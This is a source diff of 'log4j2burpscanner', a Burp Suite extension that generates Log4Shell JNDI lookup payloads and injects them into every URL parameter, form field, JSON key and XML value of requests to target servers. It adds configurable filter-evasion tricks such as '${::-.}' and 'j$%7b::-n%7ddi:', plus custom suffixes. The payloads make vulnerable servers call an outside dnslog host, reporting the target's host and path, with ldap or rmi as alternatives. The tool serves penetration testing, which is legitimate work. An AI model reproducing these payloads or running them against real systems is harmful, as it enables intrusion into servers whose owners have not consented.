@@ -87,8 +87,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
     private JCheckBox isuseUserAgentTokenXff_CheckBox; //是否使用UA、Token、XFF扫描
 
-    private JCheckBox usepointbypass_CheckBox; //是否使用UA、Token、XFF扫描
-
     private JCheckBox isuseXfflists_CheckBox; // 是否使用xff lists扫描
 
     private JCheckBox isuseAllCookie_CheckBox; // 是否全部cookie扫描
@@ -102,6 +100,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
     private JTextField fieldd1;  // jndi参数
 
     private JTextField fieldd2; // 协议名称dns ldap rmi
+
+    private JTextField fieldd3; // 后缀名称
+
+    private JTextField fielddreplace; // 替换[.]
 
     private JTextField field2; // ceye的token
 
@@ -153,8 +155,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
     private Boolean isuseUserAgentTokenXff; //(是否测试UA头、X-Forward-for头以及X-Client-IP头)
 
-    private Boolean isusepointBypas; //(是否测试UA头、X-Forward-for头以及X-Client-IP头)
-
     private Boolean isuseXfflists; // 是否测试xff头参数
 
     private Boolean isuseAllCookie; //(是否全部cookie都进行测试)
@@ -167,12 +167,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
     private String jndiparam; // jndi:   的点，可以自定义jndi:的bypass方式
 
+    private String suffixparam; // / test   的点，可以自定义后缀的bypass方式
+
+    private String usereplaceparam; // 替换.  的点，可以自定义.的bypass方式
+
 //    private IBurpCollaboratorClientContext collaboratorContext;
 
     public void registerExtenderCallbacks ( IBurpExtenderCallbacks callbacks ) {
         boolean isuseUserAgentTokenXff = true;
-
-        boolean isusepointBypas =true;
 
         boolean isuseXfflists = false;
 
@@ -192,6 +194,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 
         String jndiparam = "jndi:";
+        
+        String usereplaceparam = ".";
+
+        String suffixparam = "/%20user";
 
 //        IBurpCollaboratorClientContext collaboratorContext = null ;
         OkHttpClient client = new OkHttpClient();
@@ -237,13 +243,15 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     fileWriter.append("\n");
                     fileWriter.append("dnsldaprmi=dns");
                     fileWriter.append("\n");
+                    fileWriter.append("suffixparam=/%20user");
+                    fileWriter.append("\n");
                     fileWriter.append("jndiparams=jndi:、j$%7b::-n%7ddi:");
+                    fileWriter.append("\n");
+                    fileWriter.append("usereplaceparam=${::-.}");
                     fileWriter.append("\n");
                     fileWriter.append("whitelists=*.gov.cn、*.edu.cn");
                     fileWriter.append("\n");
                     fileWriter.append("customlists=X-Client-IP、X-Requested-With、X-Api-Version");
-                    fileWriter.append("\n");
-                    fileWriter.append("isusepointbypass=0");
                     fileWriter.append("\n");
                     fileWriter.append("isuseUserAgentTokenXff=1");
                     fileWriter.append("\n");
@@ -310,7 +318,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //            burpdns = false;
 //        }
         this.isuseUserAgentTokenXff = isuseUserAgentTokenXff; // 是否测试UA头、X-Forward-for头以及X-Client-IP头
-        this.isusepointBypas = isusepointBypas;
         this.isuseXfflists = isuseXfflists; // 是否用xff列表测试，包含其他标识IP头
         this.isuseAllCookie = isuseAllCookie; // 是否全部cookie都进行测试
         this.logxn_dnslog_code = logxn_dnslog;
@@ -324,6 +331,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         this.isuseContenttype = isuseContenttype;
         this.isuseAccept = isuseAccept;
         this.jndiparam = jndiparam;
+        this.suffixparam = suffixparam;
+        this.usereplaceparam = usereplaceparam;
         this.dnsldaprmi = dnsldaprmi;
         this.privatedns = privatedns;
 //        this.burpdns = burpdns ;
@@ -334,7 +343,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         callbacks.setExtensionName("log4j2burpscanner");
         this.stdout.println("=============================================");
         this.stdout.println("[+]              load successful!            ");
-        this.stdout.println("[+]        log4j2burpscanner v0.19.1         ");
+        this.stdout.println("[+]        log4j2burpscanner v0.20.0         ");
         this.stdout.println("[+] https://github.com/f0ng/log4j2burpscanner");
         this.stdout.println("[+]                 code by f0ng             ");
         this.stdout.println("[+]             Team:Timeline Sec            ");
@@ -353,7 +362,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
         String finalLogxn_dnslog1 = this.logxn_dnslog;
         String finalLogxn_dnslog_token = this.logxn_dnslog_token;
-        Boolean finalisusepointBypas = this.isusepointBypas;
         SwingUtilities.invokeLater(new Runnable() {
             public void run() {
                 BurpExtender.this.jndiTextArea = new JTextArea();
@@ -431,13 +439,11 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
                         total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
                         total = total + "dnsldaprmi=" + fieldd2.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
+                        total = total + "suffixparam=" + fieldd3.getText().trim() + "\n"; // 写入后缀
+                        total = total + "usereplaceparam=" + fielddreplace.getText().trim() + "\n"; // 写入后缀
                         total = total + "jndiparams=" + jndiTextArea.getText().replace("\n","、").trim() + "\n"; // 写入白名单
                         total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入白名单
                         total = total + "customlists=" + customheaders_area.getText().replace("\n","、").trim() + "\n"; // 写入自定义参数
-
-                        if (usepointbypass_CheckBox.isSelected()){ // 写入isusepointbypass参数
-                            total = total + "isusepointbypass=1\n";
-                        }else{ total = total + "isusepointbypass=0\n"; }
 
                         if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
                             total = total + "isuseUserAgentTokenXff=1\n";
@@ -484,12 +490,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         String Content = "";// 按钮返回的内容
 
                         if (fieldd2.getText().trim().contains("/")){ // 绕过//
-                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + "}";
+                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + fieldd3.getText().trim()  + "}";
                         }else
-                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + "}";
+                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + fieldd3.getText().trim() + "}";
 
-                        if (usepointbypass_CheckBox.isSelected())
-                            Content = Content.replace(".","${::-.}");
+                        if (!fielddreplace.getText().trim().equals(""))
+                            Content = Content.replace(".",fielddreplace.getText().trim());
 
                         if (use_dnslog.contains("need to configure ceye api"))
                             Content = "Fail!\nyou need to Configure dnslog and the default dnslog can't access";
@@ -516,6 +522,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
                         fieldd1.setText("jndi:");
                         fieldd2.setText("dns:");
+                        fieldd3.setText("/%20user");
                         field2.setText("xxxxxxxxxx");
                         field3.setText("xxxxx.ceye.io");
                         field22.setText("x.x.x.x");
@@ -616,12 +623,13 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                             testContent = "can't access";
                         }
                         if (fieldd2.getText().trim().contains("/")){ // 绕过//
-                            testContent = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + "}"+ "\nIf the delay exceeds 1200ms, please check the dnslog platform manually\n";
+                            testContent = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog +fieldd3.getText().trim() + "}"+ "\nIf the delay exceeds 1200ms, please check the dnslog platform manually\n";
                         }else
-                            testContent = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + "}"+ "\nIf the delay exceeds 1200ms, please check the dnslog platform manually\n";
+                            testContent = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + fieldd3.getText().trim() + "}"+ "\nIf the delay exceeds 1200ms, please check the dnslog platform manually\n";
 
-                        if (usepointbypass_CheckBox.isSelected())
-                            testContent = testContent.replace(".","${::-.}");
+                        if (!fielddreplace.getText().trim().equals(""))
+                            testContent = testContent.replace(".",fielddreplace.getText().trim());
+
                         JOptionPane.showMessageDialog(null, testContent , "Test", JOptionPane.INFORMATION_MESSAGE);
 
                     }
@@ -838,13 +846,11 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
                         total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
                         total = total + "dnsldaprmi=" + fieldd2.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
+                        total = total + "suffixparam=" + fieldd3.getText().trim() + "\n"; // 写入后缀
+                        total = total + "usereplaceparam=" + fielddreplace.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
                         total = total + "jndiparams=" + jndiTextArea.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi
                         total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi
                         total = total + "customlists=" + customheaders_area.getText().replace("\n","、").trim() + "\n"; // 写入自定义参数
-
-                        if (usepointbypass_CheckBox.isSelected()){ // 写入isusepointbypass参数
-                            total = total + "isusepointbypass=1\n";
-                        }else{ total = total + "isusepointbypass=0\n"; }
 
                         if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
                             total = total + "isuseUserAgentTokenXff=1\n";
@@ -895,12 +901,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         String Content = "";// 按钮返回的内容
 
                         if (fieldd2.getText().trim().contains("/")){ // 绕过//
-                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + "}";
+                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + fieldd3.getText().trim() + "}";
                         }else
-                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + "}";
+                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + fieldd3.getText().trim() + "}";
 
-                        if (usepointbypass_CheckBox.isSelected())
-                            Content = Content.replace(".","${::-.}");
+                        if (!fielddreplace.getText().trim().equals(""))
+                            Content = Content.replace(".",fielddreplace.getText().trim());
 
                         if (use_dnslog.contains("need to configure ceye api"))
                             Content = "Fail!\nyou need to Configure dnslog and the default dnslog can't access";
@@ -924,11 +930,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 BurpExtender.this.fieldd1 = new JTextField(); // jndi参数
 
                 JLabel labell2 = new JLabel("dnsldaprmi:");
-//                String[] sg = { "dns", "ldap", "rmi" ,"dns${::-:}", "{::-l}${::-d}${::-a}${::-p}:" ,"{::-d}${::-n}${::-s}:"};
                 BurpExtender.this.fieldd2 = new JTextField(); // 协议名称dns ldap rmi
 
-                JLabel labell22 = new JLabel("use[${::-.}]replace[.]:");
-                BurpExtender.this.usepointbypass_CheckBox = new JCheckBox();
+                JLabel labell12 = new JLabel("suffixparam:");
+                BurpExtender.this.fieldd3 = new JTextField(); // 协议名称dns ldap rmi
+
+
+                JLabel labell22 = new JLabel("usereplace[.]:");
+                BurpExtender.this.fielddreplace = new JTextField();
 
                 JLabel labell3 = new JLabel("white lists:");
                 BurpExtender.this.whitelists_area = new JTextArea(4,40);
@@ -979,6 +988,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.TRAILING)
                                 .addComponent(labell1)
                                 .addComponent(labell2)
+                                .addComponent(labell12)
                                 .addComponent(labell22)
                                 .addComponent(labell3)
                                 .addComponent(labell4)
@@ -992,7 +1002,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.LEADING)
                                 .addComponent(BurpExtender.this.fieldd1)
                                 .addComponent(BurpExtender.this.fieldd2)
-                                .addComponent(usepointbypass_CheckBox)
+                                .addComponent(BurpExtender.this.fieldd3)
+                                .addComponent(BurpExtender.this.fielddreplace)
                                 .addComponent(panelOutput)
                                 .addComponent(panelOutput2)
                                 .addComponent(BurpExtender.this.isuseUserAgentTokenXff_CheckBox)
@@ -1013,8 +1024,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                                 .addComponent(BurpExtender.this.fieldd2))
 
                         .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
+                                .addComponent(labell12)
+                                .addComponent(BurpExtender.this.fieldd3))
+
+                        .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                 .addComponent(labell22)
-                                .addComponent(BurpExtender.this.usepointbypass_CheckBox))
+                                .addComponent(BurpExtender.this.fielddreplace))
 
                         .addGroup(layoutt1.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                 .addComponent(labell3)
@@ -1082,13 +1097,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         total = total + "privatednsResponseurl=" + field33.getText().trim() + "\n"; // 写入自定义dnslog响应查看地址
                         total = total + "jndiparam=" + fieldd1.getText().trim() + "\n"; // 写入jndi:参数
                         total = total + "dnsldaprmi=" + fieldd2.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
+                        total = total + "suffixparam=" + fieldd3.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
+                        total = total + "usereplaceparam=" + fielddreplace.getText().trim() + "\n"; // 写入协议名称dns ldap rmi
                         total = total + "jndiparams=" + jndiTextArea.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi
                         total = total + "whitelists=" + whitelists_area.getText().replace("\n","、").trim() + "\n"; // 写入协议名称dns ldap rmi
                         total = total + "customlists=" + customheaders_area.getText().replace("\n","、").trim() + "\n"; // 写入自定义参数
 
-                        if (usepointbypass_CheckBox.isSelected()){ // 写入isusepointbypass参数
-                            total = total + "isusepointbypass=1\n";
-                        }else{ total = total + "isusepointbypass=0\n"; }
 
                         if (isuseUserAgentTokenXff_CheckBox.isSelected()){ // 写入isuseUserAgentTokenXff参数
                             total = total + "isuseUserAgentTokenXff=1\n";
@@ -1139,12 +1153,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         String Content = "";// 按钮返回的内容
 
                         if (fieldd2.getText().trim().contains("/")){ // 绕过//
-                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + "}";
+                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim()  + use_dnslog + fieldd3.getText().trim() + "}";
                         }else
-                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + "}";
+                            Content = "Save Success!\nyour payload is :" + "${" + fieldd1.getText().trim() + fieldd2.getText().trim() + "//" + use_dnslog + fieldd3.getText().trim() + "}";
 
-                        if (usepointbypass_CheckBox.isSelected())
-                            Content = Content.replace(".","${::-.}");
+                        if (!fielddreplace.getText().trim().equals(""))
+                            Content = Content.replace(".",fielddreplace.getText().trim());
 
                         if (use_dnslog.contains("need to configure ceye api"))
                             Content = "Fail!\nyou need to Configure dnslog and the default dnslog can't access";
@@ -1170,6 +1184,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
                         fieldd1.setText("jndi:");
                         fieldd2.setText("dns:");
+                        fieldd3.setText("/%20user");
                         field2.setText("xxxxxxxxxx");
                         field3.setText("xxxxx.ceye.io");
                         field22.setText("x.x.x.x");
@@ -1217,11 +1232,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
                 BurpExtender.this.textArea1.setText(output);
 
-                // 设置默认属性
-//                if (FileGetValue(f, "uselog4j2").equals("1"))
-//                    BurpExtender.this.log4j2passivepattern_box.setSelected(true);
-//                else
-//                    BurpExtender.this.log4j2passivepattern_box.setSelected(false);
                 BurpExtender.this.log4j2passivepattern_box.setSelected(true);
                 if (FileGetValue(f,"isuseceye").equals("1"))
                     BurpExtender.this.isuseceye_box.setSelected(true); // 是否使用ceye的dns平台
@@ -1237,11 +1247,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     BurpExtender.this.isip_box.setSelected(true);
                 else
                     BurpExtender.this.isip_box.setSelected(false);
-
-                if (FileGetValue(f,"isusepointBypas").equals("1")) // 自定义dns是否为ip
-                    BurpExtender.this.usepointbypass_CheckBox.setSelected(true);
-                else
-                    BurpExtender.this.usepointbypass_CheckBox.setSelected(false);
 
                 if (FileGetValue(f,"isuseUserAgentTokenXff").equals("1")) // 是否使用UA、Token、XFF扫描
                     BurpExtender.this.isuseUserAgentTokenXff_CheckBox.setSelected(true);
@@ -1278,18 +1283,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
                 String dnsldaprmi_param = FileGetValue(f, "dnsldaprmi"); // dnsldaprmi 参数
                 fieldd2.setText(dnsldaprmi_param);
-//                if (dnsldaprmi_param.equals("dns"))
-//                    fieldd2.setSelectedIndex(0);
-//                if (dnsldaprmi_param.equals("ldap"))
-//                    fieldd2.setSelectedIndex(1);
-//                if (dnsldaprmi_param.equals("rmi"))
-//                    fieldd2.setSelectedIndex(2);
-//                if (dnsldaprmi_param.equals("dns${::-:}"))
-//                    fieldd2.setSelectedIndex(3);
-//                if (dnsldaprmi_param.equals("{::-l}${::-d}${::-a}${::-p}:"))
-//                    fieldd2.setSelectedIndex(4);
-//                if (dnsldaprmi_param.equals("{::-d}${::-n}${::-s}:"))
-//                    fieldd2.setSelectedIndex(5);
+
+                String suffix_param = FileGetValue(f, "suffixparam"); // suffixparam 参数
+                fieldd3.setText(suffix_param);
+
+                String usereplace_param = FileGetValue(f, "usereplaceparam"); // usereplaceparam 参数
+                fielddreplace.setText(usereplace_param);
 
 
                 String ceyetoken_param = FileGetValue(f, "ceyetoken"); // ceye的token 参数
@@ -1301,7 +1300,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 String privatednslogurl_param = FileGetValue(f, "privatednslogurl"); // 自定义dnslog 参数
                 field22.setText(privatednslogurl_param);
 
-                String privatednsResponseurl_param = FileGetValue(f, "privatednsResponseurl"); // dnsldaprmi 参数
+                String privatednsResponseurl_param = FileGetValue(f, "privatednsResponseurl");
                 field33.setLineWrap(true);
                 field33.setText(privatednsResponseurl_param);
 
@@ -1339,20 +1338,13 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         return null;
     }
 
-    public String vulnurl_param (String vulnurl, String method, String host,Boolean isusepointBypas ,int i ,Boolean needincreasing){
+    public String vulnurl_param (String vulnurl, String method, String host ,int i ,Boolean needincreasing){
         String vulnurl_total = "";
-//        stdout.println(i);
-//        stdout.println(vulnurl);
-//        stdout.println( method.trim().toLowerCase() + "." + host);
-//        stdout.println(vulnurl.contains( method.trim().toLowerCase() + "." + host));
         if (i >= 0 && needincreasing){
             vulnurl_total = vulnurl.replace( method.trim().toLowerCase() + "." + host , i + "." + method.trim().toLowerCase() + "." + host);
 //            vulnurl_total = vulnurl.replace("." + String.valueOf(i-1) + "." + method.trim().toLowerCase() + "." + host ,"." + i + "." + method.trim().toLowerCase() + "." + host);
         }else
             vulnurl_total = vulnurl;
-//        vulnurl_total = vulnurl_total.replace(".","${::-.}");
-//        stdout.println(vulnurl_total);
-        if (isusepointBypas)
             vulnurl_total = vulnurl_total.replace(".","${::-.}");
 
         return vulnurl_total;
@@ -1429,12 +1421,6 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 this.privatedns = false;
             }
 
-            if (output.contains("isusepointbypass=0")){
-                this.isusepointBypas = false;
-            }else{
-                this.isusepointBypas = true;
-            }
-
             if (output.contains("isuseUserAgentTokenXff=0")){
                 this.isuseUserAgentTokenXff = false;
             }else{
@@ -1497,6 +1483,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
             this.dnsldaprmi = FileGetValue(f, "dnsldaprmi").trim();
             this.jndiparam = FileGetValue(f,"jndiparam").trim();
+            this.suffixparam = FileGetValue(f, "suffixparam").trim();
+            this.usereplaceparam = FileGetValue(f, "usereplaceparam").trim();
 
         } catch (IOException e) {}
 
@@ -1561,8 +1549,14 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         String total_uri = "";
         String[] uris = uri.split("\\.");
         for(String uri_single:uris) {
-            if (!uri_single.equals(""))
-                total_uri = total_uri + "." + uri_single.substring(0,1);
+            if (!uri_single.equals("")) { // 0.20.0
+                if ( uri_single.length() > 63)
+                    total_uri = total_uri + "." + uri_single.substring(0,5); // 0.20.0 uri的第一个字母拼接
+                else
+                    total_uri = total_uri + "." + uri_single;
+
+            }
+
         }
         uri = total_uri;
         String vulnurl = "";
@@ -1577,6 +1571,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         if (!this.dnsldaprmi.contains(":"))
             this.dnsldaprmi = this.dnsldaprmi + ":";
 
+
+
         if (this.dnsldaprmi.contains("/")){
             vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20user}";
         }else
@@ -1585,6 +1581,9 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         if (this.isip && this.privatedns){
             vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + this.logxn_dnslog.trim() + "/%20user}";
         }
+
+        if (!this.suffixparam.equals("/%20user") && this.suffixparam.contains("/")) // 0.20.0
+            vulnurl = vulnurl.replace("/%20user",this.suffixparam);
 
         String uri_total = "";
 
@@ -1606,7 +1605,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         String request2 = new String(byte_Request); //byte[] to String
         String body = request2.substring(bodyOffset); // 请求体
         if(!firstheaders[1].contains("?")) {  // 无参情况，直接在路径后面添加payload
-            firstheaders[1] = firstheaders[1] + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing);
+            firstheaders[1] = firstheaders[1] + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing);
         }
 
         // 这里一直到POST的行，因为GET、POST、PUT等其他请求都可能请求的uri有参数
@@ -1618,7 +1617,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 requries = requris[1].split("&");
                 for (String uri_single : requries) {
                     String[] uri_single_lists = uri_single.split("=");
-                    uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "&";
+                    uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "&";
                 }
                 uri_total = uri_total.substring(0, uri_total.length() - 1);
             }
@@ -1648,7 +1647,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 String[] bodys_single = body.split("&");
                 for(String body_single:bodys_single) {
                     String[] body_single_lists = body_single.split("=");
-                    body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) +  "&" ;
+                    body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) +  "&" ;
                 }
                 body_total = body_total.substring(0,body_total.length()-1);
                 body =  body_total;
@@ -1660,7 +1659,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
             else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
                 JSONObject jsonObject = JSON.parseObject(body);
                 for (String key:jsonObject.keySet()) {
-                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                    jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                 }
                 body = jsonObject.toString();
             }
@@ -1676,12 +1675,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         String[] body_single_lists = body_single.split("=");
                         JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                         for (String key:jsonObject.keySet()) {
-                            jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                         }
                         body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
                     }else {
                         String[] body_single_lists = body_single.split("=");
-                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "&";
+                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "&";
                     }
                 }
                 body_total = body_total.substring(0,body_total.length()-1);
@@ -1697,12 +1696,12 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     String[] body_single_lists = body.split(body.split("=")[0] + "=");
                     JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                     for (String key:jsonObject.keySet()) {
-                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                     }
                     body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
                 }else {
                     String[] body_single_lists = body.split("=");
-                    body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) ;
+                    body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) ;
                 }
                 body = body_total;
             }
@@ -1719,10 +1718,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     if (jsonObject.getString(key).contains("{")){
                         JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                         for (String key2:jsonObject2.keySet())
-                            jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                         jsonObject.put(key,jsonObject2);
                     } else
-                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                 }
                 body = body_code.split("=")[0] + "=" + jsonObject.toString();
             }
@@ -1735,10 +1734,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     if (jsonObject.getString(key).contains("{")){
                         JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                         for (String key2:jsonObject2.keySet())
-                            jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                            jsonObject2.put(key2,vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                         jsonObject.put(key,jsonObject2);
                     } else
-                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing));
+                        jsonObject.put(key, vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing));
                 }
                 body = jsonObject.toString();
             }
@@ -1765,7 +1764,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     for (String body_single : bodys_single) {
                         if (!body_single.contains("?xml")) {
                             String[] body_single_lists = body_single.split("=");
-                            body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "&";
+                            body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "&";
                         } else {
                             String[] body_single_lists = body_single.split("=");
                             List<String> list = new ArrayList<String>();
@@ -1777,7 +1776,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                        System.out.println(m.group(1));
                             }
                             for (String str : list) {
-                                body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "</");
+                                body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "</");
                             }
                             body_total = body_total + body_single_lists[0] + "=" + body_single_lists[1];
                         }
@@ -1804,7 +1803,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                        System.out.println(m.group(1));
                 }
                 for (String str: list){
-                    body = body.replace(">" + str + "</",">" + vulnurl_param(vulnurl,firstheaders[0], host,isusepointBypas, param_i++, this.isipincreasing) + "</");
+                    body = body.replace(">" + str + "</",">" + vulnurl_param(vulnurl,firstheaders[0], host, param_i++, this.isipincreasing) + "</");
                 }
             }
 
@@ -1820,7 +1819,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                    stdout.println(m.group(1));
                 }
                 for ( String str : list_multipart)
